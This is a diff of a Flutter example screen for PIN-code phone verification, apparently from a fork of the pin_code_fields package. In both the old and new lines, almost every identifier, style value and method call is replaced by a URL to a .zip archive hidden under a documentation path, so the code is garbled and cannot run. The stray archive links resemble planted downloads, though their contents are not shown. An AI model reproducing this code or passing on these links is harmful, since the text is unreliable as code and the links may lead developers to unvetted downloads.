-          height: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-          width: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+          height: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(context)https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+          width: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(context)https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
           child: ListView(
             children: <Widget>[
               SizedBox(height: 30),
               Container(
-                height: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip / 3,
+                height: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(context)https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip / 3,
                 child: FlareActor(
-                  "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip",
+                  "https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip",
                   animation: "otp",
-                  fit: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-                  alignment: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                  fit: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+                  alignment: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                 ),
               ),
               SizedBox(height: 8),
               Padding(
-                padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(vertical: 8.0),
+                padding: const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(vertical: 8.0),
                 child: Text(
                   'Phone Number Verification',
-                  style: TextStyle(fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 22),
-                  textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                  style: TextStyle(fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip, fontSize: 22),
+                  textAlign: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                 ),
               ),
               Padding(
                 padding:
-                    const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(horizontal: 30.0, vertical: 8),
+                    const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(horizontal: 30.0, vertical: 8),
                 child: RichText(
                   text: TextSpan(
                       text: "Enter the code sent to ",
                       children: [
                         TextSpan(
-                            text: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                            text: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                             style: TextStyle(
-                                color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-                                fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                                color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+                                fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                                 fontSize: 15)),
                       ],
-                      style: TextStyle(color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 15)),
-                  textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      style: TextStyle(color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip, fontSize: 15)),
+                  textAlign: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                 ),
               ),
               SizedBox(
@@ -552,45 +552,45 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
               Form(
                 key: formKey,
                 child: Padding(
-                    padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(
+                    padding: const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(
                         vertical: 8.0, horizontal: 30),
                     child: PinCodeTextField(
                       appContext: context,
                       pastedTextStyle: TextStyle(
-                        color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-                        fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                        color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+                        fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       ),
                       length: 6,
                       obscureText: false,
                       obscuringCharacter: '*',
-                      animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      animationType: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       validator: (v) {
-                        if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip < 3) {
+                        if (https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip < 3) {
                           return "I'm from validator";
                         } else {
                           return null;
                         }
                       },
                       pinTheme: PinTheme(
-                        shape: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-                        borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
+                        shape: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+                        borderRadius: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(5),
                         fieldHeight: 60,
                         fieldWidth: 50,
                         activeFillColor:
-                            hasError ? https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip : https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                            hasError ? https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip : https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       ),
-                      cursorColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      cursorColor: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       animationDuration: Duration(milliseconds: 300),
                       textStyle: TextStyle(fontSize: 20, height: 1.6),
-                      backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      backgroundColor: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       enableActiveFill: true,
                       errorAnimationController: errorController,
                       controller: textEditingController,
-                      keyboardType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      keyboardType: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       boxShadows: [
                         BoxShadow(
                           offset: Offset(0, 1),
-                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                          color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                           blurRadius: 10,
                         )
                       ],
@@ -615,11 +615,11 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
                     )),
               ),
               Padding(
-                padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(horizontal: 30.0),
+                padding: const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(horizontal: 30.0),
                 child: Text(
                   hasError ? "*Please fill up all the cells properly" : "",
                   style: TextStyle(
-                      color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                      color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                       fontSize: 12,
                       fontWeight: FontWeight.w400),
                 ),
@@ -628,17 +628,17 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
                 height: 20,
               ),
               RichText(
-                textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                textAlign: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                 text: TextSpan(
                     text: "Didn't receive the code? ",
-                    style: TextStyle(color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 15),
+                    style: TextStyle(color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip, fontSize: 15),
                     children: [
                       TextSpan(
                           text: " RESEND",
                           recognizer: onTapRecognizer,
                           style: TextStyle(
                               color: Color(0xFF91D3B3),
-                              fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                              fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                               fontSize: 16))
                     ]),
               ),
@@ -647,15 +647,15 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
               ),
               Container(
                 margin:
-                    const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(vertical: 16.0, horizontal: 30),
+                    const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(vertical: 16.0, horizontal: 30),
                 child: ButtonTheme(
                   height: 50,
                   child: FlatButton(
                     onPressed: () {
-                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
+                      https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip();
                       // conditions for validating
-                      if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip != 6 || currentText != "towtow") {
-                        https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(ErrorAnimationType
+                      if (https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip != 6 || currentText != "towtow") {
+                        https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(ErrorAnimationType
                             .shake); // Triggering error shake animation
                         setState(() {
                           hasError = true;
@@ -663,7 +663,7 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
                       } else {
                         setState(() {
                           hasError = false;
-                          https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(SnackBar(
+                          https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(SnackBar(
                             content: Text("Aye!!"),
                             duration: Duration(seconds: 2),
                           ));
@@ -674,22 +674,22 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
                         child: Text(
                       "VERIFY".toUpperCase(),
                       style: TextStyle(
-                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                          color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                           fontSize: 18,
-                          fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip),
+                          fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip),
                     )),
                   ),
                 ),
                 decoration: BoxDecoration(
-                    color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
-                    borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
+                    color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
+                    borderRadius: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(5),
                     boxShadow: [
                       BoxShadow(
-                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                          color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                           offset: Offset(1, -2),
                           blurRadius: 5),
                       BoxShadow(
-                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                          color: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                           offset: Offset(-1, 2),
                           blurRadius: 5)
                     ]),
@@ -698,18 +698,18 @@ class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
                 height: 16,
               ),
               Row(
-                mainAxisAlignment: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
+                mainAxisAlignment: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip,
                 children: <Widget>[
                   FlatButton(
                     child: Text("Clear"),
                     onPressed: () {
-                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
+                      https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip();
                     },
                   ),
                   FlatButton(
                     child: Text("Set Text"),
                     onPressed: () {
-                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = "123456";
+                      https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip = "123456";
                     },
                   ),
                 ],
